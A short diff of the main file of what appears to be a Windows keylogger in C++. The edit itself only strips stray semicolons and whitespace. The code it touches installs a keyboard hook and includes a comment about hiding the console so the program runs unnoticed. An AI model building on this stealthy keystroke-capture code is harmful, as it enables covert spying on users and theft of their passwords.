@@ -1,10 +1,10 @@
 #include <iostream>
 #include <windows.h>
-#include "Base64.h";
-#include "Helper.h";
-#include "Timer.h";
-#include "IO.h";
-#include "KeyBHook.h";
+#include "Base64.h"
+#include "Helper.h"
+#include "Timer.h"
+#include "IO.h"
+#include "KeyBHook.h"
 
 int main()
 {
@@ -13,7 +13,7 @@ int main()
     We need to avoid raising the console window
     when the program executes, so that the program can run
     unnoticed.
-    */  
+    */
     IO::MKDir(IO::GetPath(true));
     InstallHook();
 
